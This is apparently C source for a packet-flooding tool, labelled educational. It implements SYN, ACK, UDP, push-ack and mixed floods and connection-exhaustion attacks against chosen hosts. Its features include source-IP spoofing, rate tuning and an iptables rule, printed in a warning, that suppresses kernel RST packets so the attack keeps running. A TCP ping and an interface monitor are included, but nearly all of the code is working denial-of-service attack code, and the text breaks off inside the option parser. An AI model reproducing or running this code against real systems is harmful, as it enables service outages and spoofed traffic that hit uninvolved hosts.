/* Created by edubart FOR EDUCATIONAL AND TESTING purposes only.
 * Project page https://github.com/edubart/synack
 */

#include "leef.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <sys/time.h>
#include <pthread.h>
#include <ctype.h>

#define MAX(a,b) (a > b ? a : b)
#define MIN(a,b) (a < b ? a : b)
#define SWAP(a,b) { int t = b; b = a; a = t; }

enum e_action {
    TCP_PING,
    CONN_FLOOD,
    SYN_FLOOD,
    ACK_FLOOD,
    UDP_FLOOD,
    MIX_FLOOD,
    MIX2_FLOOD,
    PA_FLOOD,
    MONITOR,
};

/* global variables */
volatile int running = 1;
uint32_t src_addr = 1;
const char *interface = NULL;
volatile uint32_t sleep_interval = 10000;
uint8_t action_uuid = 0;
uint32_t run_time = 0;
int action = TCP_PING;
int num_threads = 1;
uint32_t *spoof_addresses = NULL;
uint32_t spoof_addresses_size = 0;
uint8_t *send_data = NULL;
int send_data_size = 0;
int quiet = 0;
int drop_on_ack = 0;
int drop_time = -1;
int use_tcp_options = 0;
int fill_data_with_random = 0;
int pps_output = 0;
uint8_t src_mac[6];
uint8_t dest_mac[6];
int rawsendto = 0;
uint32_t max_send_packets = 0;
uint32_t targets[100][2];
int num_targets = 0;

char *ltrim(char *s)
{
    while(isspace(*s)) s++;
    return s;
}

char *rtrim(char *s)
{
    char* back = s + strlen(s);
    while(isspace(*--back));
    *(back+1) = '\0';
    return s;
}

char *trim(char *s)
{
    return rtrim(ltrim(s));
}

uint8_t *get_send_data()
{
    int i;
    if(send_data_size > 0) {
        if(fill_data_with_random) {
            for(i=0;i<send_data_size;++i)
                send_data[i] = leef_random_byte();
        }
        return send_data;
    }
    return NULL;
}

uint32_t get_src_ip()
{
    if(spoof_addresses_size > 0) {
        /* shuffle ips list */
        static int i = 0;
        int j = i + (leef_rand() / ((LEEF_RAND_MAX / (spoof_addresses_size - i)) + 1));
        SWAP(spoof_addresses[i], spoof_addresses[j]);
        uint32_t ip = spoof_addresses[i++];
        if(i >= spoof_addresses_size-1)
            i = 0;
        return ip;
    } else if(src_addr == 0)
        return leef_random_ip();
    else
        return src_addr;
}

void read_macaddr(uint8_t dest[6], const char *str)
{
    unsigned int tmp[6];
    sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
           &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
    int i;
    for(i=0;i<6;++i)
        dest[i] = (uint8_t)tmp[i];
}

void recalculate_sleep_interval(int pps) {
    if(pps == 0 || pps_output == 0)
        return;

    /* tries to adjust a new sleep_interval */
    float error_percent = (pps - pps_output) / (float)pps_output;
    float margin = fabs(error_percent) * sleep_interval;
    if(margin >= 1.0f) {
        int new_sleep_interval = sleep_interval + ceilf(sleep_interval * error_percent);
        new_sleep_interval = MAX(new_sleep_interval, 0);
        new_sleep_interval = MIN(new_sleep_interval, 1000000);
        sleep_interval = new_sleep_interval;
    }
}

typedef struct {
    uint32_t src_addr, dest_addr;
    uint16_t src_port, dest_port;
    uint16_t id;
    uint32_t seq, ack_seq;
    uint8_t flags;
    uint32_t send_ticks;
} tcp_queue_entry;

#define MAX_PACKETS_QUEUE 10000

/* Connection flood sniff thread */
void *conn_flood_sniff_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);
    leef_set_sniff_packet_size(&leef, 64);

    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack_seq;
    uint32_t last_ticks;
    uint32_t ticks_now;
    uint32_t last_queue_flush = 0;
    uint8_t flags;
    int syn_sent = 0;
    int rst_sent = 0;
    int synack_received = 0;
    int rst_received = 0;
    int fin_received = 0;
    int push_received = 0;
    int ack_received = 0;
    int alive_connections = 0;
    int new_connections = 0;
    int tx_bytes = 0;
    int rx_bytes = 0;
    long long total_syn_sent = 0;
    long long total_rst_sent = 0;
    long long total_synack_received = 0;
    long long total_rst_received = 0;
    long long total_fin_received = 0;
    long long total_push_received = 0;
    long long total_ack_received = 0;
    long long total_new_connections = 0;
    long long total_tx_bytes = 0;
    long long total_rx_bytes = 0;
    double connections_fail;
    leef_sniffed_packet packet;
    tcp_queue_entry *packets_queue = malloc(sizeof(tcp_queue_entry) * MAX_PACKETS_QUEUE);
    tcp_queue_entry *queue_packet;
    int in_queue = 0;
    int conn_ports[65536];
    int i;

    memset(conn_ports, 0, sizeof(conn_ports));
    memset(packets_queue, 0xff, sizeof(tcp_queue_entry) * MAX_PACKETS_QUEUE);

    last_ticks = leef_get_ticks();

    while(1) {
        ticks_now = leef_get_ticks();

        if(ticks_now - last_queue_flush >= 1) {
            for(i=0;i<MAX_PACKETS_QUEUE;++i) {
                queue_packet = &packets_queue[i];
                if(queue_packet->send_ticks == 0xffffffff || ticks_now < queue_packet->send_ticks)
                    continue;

                if(queue_packet->flags & TCP_RST) {
                    if(conn_ports[queue_packet->src_port] == 1) {
                        conn_ports[queue_packet->src_port] = 0;
                        alive_connections--;
                        rst_sent++;
                    } else
                        continue;
                }

                leef_send_raw_tcp2(&leef,
                                    queue_packet->src_addr, queue_packet->dest_addr,
                                    queue_packet->src_port, queue_packet->dest_port,
                                    queue_packet->id, queue_packet->seq, queue_packet->ack_seq,
                                    queue_packet->flags,
                                    0,
                                    NULL);
                tx_bytes += 54;

                queue_packet->send_ticks = 0xffffffff;
            }
            last_queue_flush = ticks_now;
        }

        /* outputs attack information */
        if(ticks_now - last_ticks >= 1000) {
            total_syn_sent += syn_sent;
            total_rst_sent += rst_sent;
            total_synack_received += synack_received;
            total_rst_received += rst_received;
            total_fin_received += fin_received;
            total_push_received += push_received;
            total_ack_received += ack_received;
            total_new_connections += new_connections;
            total_tx_bytes += tx_bytes;
            total_rx_bytes += rx_bytes;

            if(!running)
                break;

            if(!quiet) {
                printf("tx_SYN=%d tx_RA=%d rx_SA=%d rx_RA=%d rx_FA=%d rx_PA=%d rx_ACK=%d NEW=%d FAIL=%d ALIVE=%d tx=%d pps (%.02f kbps) rx=%d pps (%.02f kbps)\n",
                    syn_sent,
                    rst_sent,
                    synack_received,
                    rst_received,
                    fin_received,
                    push_received,
                    ack_received,
                    new_connections,
                    MAX(syn_sent - new_connections, 0),
                    alive_connections,
                    syn_sent + rst_sent + synack_received,
                    (tx_bytes * 8)/1000.0f,
                    fin_received + push_received + ack_received + rst_received + synack_received,
                    (rx_bytes * 8)/1000.0f);
                fflush(stdout);
            }

            recalculate_sleep_interval(syn_sent);

            synack_received = 0;
            rst_received = 0;
            fin_received = 0;
            push_received = 0;
            ack_received = 0;
            syn_sent = 0;
            rst_sent = 0;
            new_connections = 0;
            tx_bytes = 0;
            rx_bytes = 0;
            last_ticks = ticks_now;
        }

        if(leef_sniff_next_packet(&leef, &packet, 1)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP &&
               packet.ip->saddr == dest_addr &&
               packet.in_ip.tcp->source == dest_port) {
                /* check if the packet was from this running attack instance */
                if(packet.in_ip.tcp->ack == 1 &&
                   action_uuid != ((packet.in_ip.tcp->ack_seq & 0xff000000) >> 24))
                    continue;
                rx_bytes += packet.len;
                src_port = packet.in_ip.tcp->dest;
                /* SYN+ACK */
                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
                    synack_received++;
                    id = (((packet.in_ip.tcp->ack_seq - 1) & 0xffff00) >> 8) + 1;
                    seq = packet.in_ip.tcp->ack_seq;
                    ack_seq = packet.in_ip.tcp->seq + 1;

                    if(send_data_size > 0) {
                        flags = TCP_ACK | TCP_PUSH;
                        leef_send_raw_tcp2(&leef,
                                           src_addr, dest_addr,
                                           src_port, dest_port,
                                           id, seq, ack_seq,
                                           flags,
                                           send_data_size,
                                           get_send_data());
                        tx_bytes += 54 + send_data_size;
                    } else {
                        leef_send_tcp_ack(&leef,
                                          src_addr, dest_addr,
                                          src_port, dest_port,
                                          id, seq, ack_seq);
                        tx_bytes += 54;
                    }

                    if(conn_ports[src_port] == 0) {
                        conn_ports[src_port] = 1;
                        alive_connections++;
                        new_connections++;
                    }

                    if(drop_time >= 0) {
                        queue_packet = &packets_queue[in_queue++];
                        if(in_queue >= MAX_PACKETS_QUEUE)
                            in_queue = 0;

                        queue_packet->id = id+1;
                        queue_packet->flags = TCP_ACK | TCP_RST;
                        queue_packet->src_addr = src_addr;
                        queue_packet->dest_addr = dest_addr;
                        queue_packet->src_port = src_port;
                        queue_packet->dest_port = dest_port;
                        queue_packet->seq = seq;
                        queue_packet->ack_seq = ack_seq;
                        queue_packet->send_ticks = ticks_now + drop_time;
                    }
                /* RST */
                } else if(packet.in_ip.tcp->rst == 1) {
                    static int warned = 0;
                    if(!warned && rst_received >= 0) {
                        if(!quiet) {
                            printf("host started rejecting connections\n");
                            fflush(stdout);
                        }
                        warned = 1;
                    }

                    rst_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                /* FIN */
                } else if(packet.in_ip.tcp->fin == 1) {
                    static int warned = 0;
                    if(!warned && fin_received == 0) {
                        if(!quiet) {
                            printf("host started ending connections, guessed connection timeout: %d secs\n", leef_get_ticks() / 1000);
                            fflush(stdout);
                        }
                        warned = 1;
                    }

                    fin_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                /* ACK, drop connection if enabled */
                } else if(packet.in_ip.tcp->ack == 1) {
                    if(packet.in_ip.tcp->psh)
                        push_received++;
                    else
                        ack_received++;
                    if(drop_on_ack) {
                        seq = packet.in_ip.tcp->ack_seq;
                        id = (((packet.in_ip.tcp->ack_seq - 2) & 0xffff00) >> 8) + 2;
                        ack_seq = packet.in_ip.tcp->seq;
                        flags = TCP_ACK | TCP_RST;
                        leef_send_raw_tcp2(&leef,
                                        src_addr, dest_addr,
                                        src_port, dest_port,
                                        id, seq, ack_seq,
                                        flags,
                                        0,
                                        NULL);
                        rst_sent++;
                        tx_bytes += 54;
                        if(conn_ports[src_port] == 1) {
                            alive_connections--;
                            conn_ports[src_port] = 0;
                        }
                    }
                }
            /* check if the packet is to the host */
            } else if(packet.ip->protocol == IPPROTO_TCP &&
                      packet.ip->saddr == src_addr &&
                      packet.ip->daddr == dest_addr &&
                      packet.in_ip.tcp->dest == dest_port) {
                /* SYN sent from us */
                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0 &&
                   action_uuid == ((packet.in_ip.tcp->seq & 0xff000000) >> 24)) {
                    syn_sent++;
                    tx_bytes += packet.len;
                    if(conn_ports[packet.in_ip.tcp->source] == 1) {
                        conn_ports[packet.in_ip.tcp->source] = 0;
                        alive_connections--;
                    }
                /* RST sent by the kernel that aborts the attack*/
                } else if(packet.in_ip.tcp->rst == 1 && packet.in_ip.tcp->ack == 0) {
                    static int warned = 0;
                    if(!warned ) {
                        printf("WARNING: cough RST sent by kernel, this means that the kernel is aborting your attacks,\n"
                               "         please make sure that you have the following rule in your iptables firewall:\n"
                               "             iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP\n");
                        fflush(stdout);
                        warned = 1;
                    }
                }
            }
        }
    }

    connections_fail = total_syn_sent > 0 ? ((total_syn_sent-total_new_connections) * 100.0)/(double)total_syn_sent : .0;
    if(!quiet) {
        printf("\n--- %s:%d connection flood statistics ---\n",  leef_addr_to_string(dest_addr), dest_port);
        printf("%lld SYN sent, %lld ACK sent, %lld RST sent\n"
               "%lld SA received, %lld RA received, %lld FA received, %lld PA received, %lld A received\n"
               "%lld connection made, %lld connections failed, %.02f%% connections failed\n"
               "%d connections still alive\n"
               "%lld packets sent, %.02f MB sent\n",
               total_syn_sent, total_synack_received, total_rst_sent,
               total_synack_received, total_rst_received, total_fin_received, total_push_received, total_ack_received,
               total_new_connections, total_syn_sent - total_new_connections, connections_fail,
               alive_connections,
               total_syn_sent+total_synack_received, total_tx_bytes/1000000.0);
    }

    leef_terminate(&leef);
    free(packets_queue);
    return NULL;
}

/* Connection flood send thread */
void *conn_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    pthread_t sniff_thread;
    pthread_create(&sniff_thread, NULL, conn_flood_sniff_thread, param);

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    uint16_t src_port = leef_random_src_port();
    uint16_t id;
    uint32_t seq;

    while(running) {
        if(++src_port >= 61000)
            src_port = 1025;
        id = leef_random_byte() << 8 | leef_random_byte();
        seq = (action_uuid << 24) | (id << 8) | leef_random_byte();
        leef_send_tcp_syn(&leef,
                          src_addr, dest_addr,
                          src_port, dest_port,
                          id, seq,
                          use_tcp_options);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);

    pthread_join(sniff_thread, NULL);
    return NULL;
}

/* calculate interface TX */
void interface_tx_thread()
{
    uint32_t last_ticks = leef_get_ticks();
    uint32_t ticks_now;
    int64_t lastTxPackets = leef_get_txpackets();
    int64_t lastTxBytes = leef_get_txbytes();
    int64_t initialTxPackets = lastTxPackets;
    int64_t initialTxBytes = lastTxBytes;
    int64_t txPackets;
    int64_t txBytes;

    while(running) {
        ticks_now = leef_get_ticks();
        if(ticks_now - last_ticks >= 1000) {
            txPackets = leef_get_txpackets();
            txBytes = leef_get_txbytes();
            int pps = (txPackets - lastTxPackets);
            if(!quiet) {
                if(run_time > 0)
                    printf("%.1f%%, ", (ticks_now/10)/(float)run_time);
                printf("%s =>  tx_packets: %d pps (%.02f mbps)\n",
                    interface,
                    pps,
                    (txBytes - lastTxBytes) * BYTEPSEC_TO_MBITPSEC);
                fflush(stdout);
            }
            last_ticks = ticks_now;
            lastTxPackets = txPackets;
            lastTxBytes = txBytes;

            recalculate_sleep_interval(pps);
        }
        usleep(10 * 1000);
    }

    /* print stastistics */
    if(!quiet) {
        printf("\n--- %s tx statistics ---\n", interface);
        printf("%lld packets sent, %.02f MB sent\n",
            (long long)(leef_get_txpackets()- initialTxPackets),
            (double)(leef_get_txbytes() - initialTxBytes)/1000000.0);
    }
}

void interface_traffic_thread()
{
    uint32_t last_ticks = leef_get_ticks();
    uint32_t ticks_now;
    int64_t lastRxPackets = leef_if_rx_packets(interface);
    int64_t lastRxDropped = leef_if_rx_dropped(interface);
    int64_t lastRxBytes = leef_if_rx_bytes(interface);
    int64_t initialRxPackets = lastRxPackets;
    int64_t initialRxDropped = lastRxDropped;
    int64_t initialRxBytes = lastRxBytes;
    int64_t rxPackets;
    int64_t rxDropped;
    int64_t rxBytes;
    int64_t lastTxPackets = leef_if_tx_packets(interface);
    int64_t lastTxDropped = leef_if_tx_dropped(interface);
    int64_t lastTxBytes = leef_if_tx_bytes(interface);
    int64_t initialTxPackets = lastTxPackets;
    int64_t initialTxDropped = lastTxDropped;
    int64_t initialTxBytes = lastTxBytes;
    int64_t txPackets;
    int64_t txDropped;
    int64_t txBytes;

    while(running) {
        ticks_now = leef_get_ticks();
        if(ticks_now - last_ticks >= 1000) {
            rxPackets = leef_if_rx_packets(interface);
            rxDropped = leef_if_rx_dropped(interface);
            rxBytes = leef_if_rx_bytes(interface);
            txPackets = leef_if_tx_packets(interface);
            txDropped = leef_if_tx_dropped(interface);
            txBytes = leef_if_tx_bytes(interface);
            printf("%s =>  rx_packets: %d pps (%.02f mbps)    rx_dropped: %d pps    tx_packets: %d pps (%.02f mbps)    tx_dropped: %d pps\n",
                interface,
                (int)(rxPackets - lastRxPackets),
                (rxBytes - lastRxBytes) * BYTEPSEC_TO_MBITPSEC,
                (int)(rxDropped - lastRxDropped),
                (int)(txPackets - lastTxPackets),
                (txBytes - lastTxBytes) * BYTEPSEC_TO_MBITPSEC,
                (int)(txDropped - lastTxDropped));
            fflush(stdout);
            last_ticks = ticks_now;
            lastRxPackets = rxPackets;
            lastRxDropped = rxDropped;
            lastRxBytes = rxBytes;
            lastTxPackets = txPackets;
            lastTxDropped = txDropped;
            lastTxBytes = txBytes;
        }
        usleep(10 * 1000);
    }

    printf("\n--- %s rx/tx statistics ---\n", interface);
    printf("%lld packets received, %lld packets dropped, %.02f MB received\n",
        (long long)(leef_if_rx_packets(interface) - initialRxPackets),
        (long long)(leef_if_rx_dropped(interface) - initialRxDropped),
        (double)(leef_if_rx_bytes(interface) - initialRxBytes)/1000000.0);
    printf("%lld packets sent, %lld packets dropped, %.02f MB sent\n",
        (long long)(leef_if_tx_packets(interface) - initialTxPackets),
        (long long)(leef_if_tx_dropped(interface) - initialTxDropped),
        (double)(leef_if_tx_bytes(interface) - initialTxBytes)/1000000.0);
}

/* SYN flood */
void *syn_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    while(running) {
        leef_send_tcp_syn(&leef,
                          get_src_ip(), dest_addr,
                          leef_random_src_port(), dest_port ? dest_port : leef_random_dest_syn_port(),
                          leef_random_u16(), leef_random_u32(),
                          use_tcp_options);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    return NULL;
}

/* ACK flood */
void *ack_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    while(running) {
        leef_send_tcp_ack(&leef,
                          get_src_ip(), dest_addr,
                          leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                          leef_random_u16(), leef_random_u32(), leef_random_u32());
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    return NULL;
}

/* UDP flood */
void *udp_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    while(running) {
        leef_send_udp_data(&leef,
                           get_src_ip(), dest_addr,
                           leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                           leef_random_u16(),
                           send_data_size, get_send_data());
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    return NULL;
}

/* MIX flood */
void *mix_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    while(running) {
        switch(leef_rand() % 4) {
            case 0: /* SYN */
                leef_send_tcp_syn(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_syn_port(),
                                leef_random_u16(), leef_random_u32(),
                                use_tcp_options);
                break;
            case 1: /* ACK */
                leef_send_tcp_ack(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                                leef_random_u16(), leef_random_u32(), leef_random_u32());
                break;
            case 2: /* PUSH + ACK */
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_PUSH | TCP_ACK,
                                send_data_size, get_send_data());
            case 3: /* FIN + ACK */
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_FIN | TCP_ACK,
                                0, NULL);
                break;
        }
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    return NULL;
}

/* MIX2 flood */
void *mix2_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    while(running) {
        switch(leef_rand() % 3) {
            case 0: /* ACK */
                leef_send_tcp_ack(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                                leef_random_u16(), leef_random_u32(), leef_random_u32());
                break;
            case 1: /* PUSH + ACK */
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_PUSH | TCP_ACK,
                                send_data_size, get_send_data());
            case 2: /* FIN + ACK */
                leef_send_raw_tcp2(&leef,
                                get_src_ip(), dest_addr,
                                leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                                leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                TCP_FIN | TCP_ACK,
                                0, NULL);
                break;
        }
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    return NULL;
}

/* PA flood */
void *pa_flood_attack_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    while(running) {
        leef_send_raw_tcp2(&leef,
                        get_src_ip(), dest_addr,
                        leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
                        leef_random_u16(), leef_random_u32(), leef_random_u32(),
                        TCP_PUSH | TCP_ACK,
                        send_data_size, get_send_data());
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    return NULL;
}

/* TCP ping */
void *tcp_ping_thread(void *param)
{
    int tid = (long)param;
    uint32_t dest_addr = targets[tid][0];
    uint16_t dest_port = targets[tid][1];

    struct leef_handle leef;
    if(!leef_init(&leef, interface, SNIFFING_AND_INJECTING))
        return NULL;

    if(rawsendto)
        leef_enable_rawsendto(&leef, src_mac, dest_mac);

    leef_set_sniff_packet_size(&leef, 128);

    leef_sniffed_packet packet;
    uint16_t src_port = leef_random_src_port();
    uint32_t ping_ports[65536];
    uint32_t last_ticks;
    uint32_t ticks_now;
    memset(ping_ports, 0, sizeof(ping_ports));
    int sent = 0;
    int received = 0;
    unsigned long rtt_sum = 0;
    int rtt;
    int min_rtt = 9999999;
    int max_rtt = -1;
    int stopping = 0;

    last_ticks = leef_get_ticks();

    while(1) {
        ticks_now = leef_get_ticks();
        if(!running && !stopping) {
            stopping = 1;
            last_ticks = ticks_now;
        }

        /* outputs attack information */
        if(!stopping && ticks_now - last_ticks >= 1000) {
            last_ticks = ticks_now;

            if(++src_port >= 61000)
                src_port = 32769;

            /* send a SYN ping */
            leef_send_tcp_syn(&leef,
                              src_addr, dest_addr,
                              src_port, dest_port,
                              leef_random_u16(), (action_uuid << 24) | sent,
                              use_tcp_options);
            sent++;
            ping_ports[src_port] = ticks_now;
        /* wait 1 sec before stopping */
        } else if(stopping && leef_get_ticks() - last_ticks >= 500)
            break;

        if(leef_sniff_next_packet(&leef, &packet, 50)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP &&
               packet.ip->saddr == dest_addr &&
               packet.in_ip.tcp->source == dest_port &&
               action_uuid == ((packet.in_ip.tcp->ack_seq & 0xff000000) >> 24)) {
                /* got a ping reply */
                if(ping_ports[packet.in_ip.tcp->dest] != 0) {
                    rtt = (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]);
                    if(!quiet) {
                        printf("ip=%s sport=%d flags=%s ttl=%d size=%d seq=%d rrt=%d ms\n",
                            leef_addr_to_string(dest_addr),
                            dest_port,
                            leef_name_tcp_flags(&packet),
                            packet.ip->ttl,
                            packet.ip->tot_len,
                            (packet.in_ip.tcp->ack_seq - 1) & 0xFFFFFF,
                            rtt);
                        fflush(stdout);
                    }
                    ping_ports[packet.in_ip.tcp->dest] = 0;
                    received++;
                    rtt_sum += rtt;
                    min_rtt = MIN(rtt, min_rtt);
                    max_rtt = MAX(rtt, max_rtt);
                } else {
                    if(!quiet) {
                        printf("DUP! ip=%s sport=%d flags=%s ttl=%d size=%d seq=%d\n",
                            leef_addr_to_string(dest_addr),
                            dest_port,
                            leef_name_tcp_flags(&packet),
                            packet.ip->ttl,
                            packet.ip->tot_len,
                            (packet.in_ip.tcp->ack_seq - 1) & 0xFFFF);
                        fflush(stdout);
                    }
                }
            }
        }
    }

    /* print stastistics */
    if(!quiet) {
        printf("\n--- %s:%d ping statistics ---\n", leef_addr_to_string(dest_addr), dest_port);
        printf("%d packets sent, %d packets received, %.02f%% packet loss\n",
            sent,
            received,
            sent > 0 ? ((sent - received)*100.0f)/(float)sent : .0f);

        if(received > 0) {
            printf("rtt min/avr/max = %d/%d/%d ms\n",
                min_rtt,
                (int)(rtt_sum/received),
                max_rtt);
        }
    }

    leef_terminate(&leef);
    return NULL;
}

void *run_timer_thread(void *param)
{
    while(running) {
        if(run_time > 0 && leef_get_ticks() / 1000 >= run_time)
            break;
        if(max_send_packets > 0 && leef_get_txpackets() >= max_send_packets)
            break;
        usleep(10*1000);
    }
    running = 0;
    return NULL;
}

void print_help(char **argv)
{
    printf("Usage: %s -i <interface> -h <host> [action] [options]\n", argv[0]);
    printf("Actions:\n");
    printf("  -P                - TCP ping (default action)\n");
    printf("  -C                - Connection flood\n");
    printf("  -S                - SYN flood\n");
    printf("  -A                - ACK flood\n");
    printf("  -D                - PA flood\n");
    printf("  -M                - Mixed S/A/PA/FA flood\n");
    printf("  -N                - Mixed A/PA/FA flood\n");
    printf("  -U                - UDP flood\n");
    printf("  -O                - Monitor interface traffic\n");
    printf("General options:\n");
    printf("  -i [interface]    - Which interface to do the action (required)\n");
    printf("  -h [host,host2]   - Target hosts separated by comma, accepts 'host:port' syntax too (required)\n");
    printf("  -p [port]         - Target port (default: random)\n");
    printf("  -t [time]         - Run time in seconds (default: infinite)\n");
    printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
    printf("  -j [pps]          - Calculates a sleep interval for desired packets per second output (accurate with multiple threads)\n");
    printf("  -b [bytes]        - Additional random bytes to send as data (default: 0)\n");
    printf("  -m [threads]      - Number of send threads (default: 1)\n");
    printf("  -s [ip]           - Custom source ip, you may set to 'random' (default: interface ip)\n");
    printf("  -d [binary file]  - Send binary file as data\n");
    printf("  -z [page] [host]  - Send simple HTTP 1.1 request as data\n");
    printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
    printf("  -o                - Enable tcp options on SYN packets\n");
    printf("  -q                - Quiet, don't print statistics output\n");
    printf("  -x                - Drop established connections when receive ACK packets\n");
    printf("  -y [delay]        - Drop established connections after delay\n");
    printf("  -k [smac] [dmac]  - Use rawsendto kernel patch to send massive kpps\n");
    printf("  -c [count]        - Max number of packets to send\n");
    printf("  --help            - Print this help\n");
}

void signal_handler(int sig) {
    running = 0;
}

int main(int argc, char **argv)
{
    /* catch signals */
    signal(SIGTERM, &signal_handler);
    signal(SIGINT, &signal_handler);
    srand(time(NULL));

    if(argc == 1) {
        print_help(argv);
        return 0;
    }

    /* generate attack uuid */
    static struct timeval tv;
    gettimeofday(&tv, 0);
    action_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xff;

    /* handle options */
    int arg;
    const char *opt;
    uint16_t dest_port = 0;
    for(arg=1;arg<argc;arg++) {
        opt = argv[arg];
        if(opt && opt[0] == '-' && strlen(opt) == 2) {
            switch(opt[1]) {
                case 'C':
                    action = CONN_FLOOD;
                    break;
                case 'S':
                    action = SYN_FLOOD;
                    break;
                case 'A':
                    action = ACK_FLOOD;
                    break;
                case 'P':
                    action = TCP_PING;
                    break;
                case 'M':
                    action = MIX_FLOOD;
                    break;
                case 'N':
                    action = MIX2_FLOOD;
                    break;
                case 'U':
                    action = UDP_FLOOD;
                    break;
                case 'D':
                    action = PA_FLOOD;
                    break;
                case 'O':
                    action = MONITOR;
                    break;
                case 'i':
                    interface = argv[++arg];
                    if(src_addr == 1) {
                        src_addr = leef_if_ipv4(interface);
                        if(src_addr == 0) {
                            fprintf(stderr, "could not read interface ipv4 address\n");
                            return -1;
                        }
                    }
                    break;
                case 'h': {
                    char targetsstr[2048];
                    strcpy(targetsstr, argv[++arg]);

                    char *tok1, *tok2;
                    char *targetstr = strtok_r(targetsstr, " ,", &tok1);
                    while(targetstr != NULL)
                    {
                        char *thoststr = strtok_r(targetstr, ":", &tok2);
                        char *tportstr = strtok_r(NULL, ":", &tok2);

                        uint32_t dest_addr = leef_resolve_hostname(thoststr);
                        if(dest_addr == -1) {
                            fprintf(stderr, "could not resolve hostname address\n");
                            return -1;
                        }
                        uint32_t dest_port = 0xFFFFFFFF;
                        if(tportstr)
                            dest_port = atoi(tportstr);

                        targetstr = strtok_r(NULL, " ,", &tok1);

                        if(dest_addr != 0 && dest_addr != (uint32_t)-1) {
                            targets[num_targets][0] = dest_addr;
                            targets[num_targets][1] = dest_port;
                            num_targets++;
                        }
                    }
                    break;
                }
                case 'p':
                    dest_port = atoi(argv[++arg]);
                    break;
                case 'm':
